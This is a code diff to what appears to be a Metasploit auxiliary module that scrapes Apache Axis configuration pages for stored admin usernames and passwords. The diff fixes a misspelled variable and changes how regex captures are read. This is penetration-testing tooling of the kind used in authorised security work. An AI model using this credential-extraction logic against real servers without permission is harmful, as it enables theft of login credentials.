@@ -91,16 +91,18 @@ class Metasploit3 < Msf::Auxiliary
 			if (res and res.code == 200)
 				if res.body.to_s.match(/axisconfig/)
 
-					username = res.body.to_s.scan(/parameter\sname=\"userName\">([^\s]+)</)
-					password = res.body.to_s.scan(/parameter\sname=\"password\">([^\s]+)</)
+					res.body.scan(/parameter\sname=\"userName\">([^\s]+)</)
+					username = $1
+					res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
+					password = $1
 
-					print_good("#{target_url} - Apache Axis - Credentials Found Username: #{username} - Password: #{password}")
+					print_good("#{target_url} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")
 
 					report_auth_info(
 						:host => rhost,
 						:proto => 'axis',
 						:user => username,
-						:pass => passowrd,
+						:pass => password,
 						:target_host => rhost,
 						:target_port => rport,
 						:vhost  => vhost,
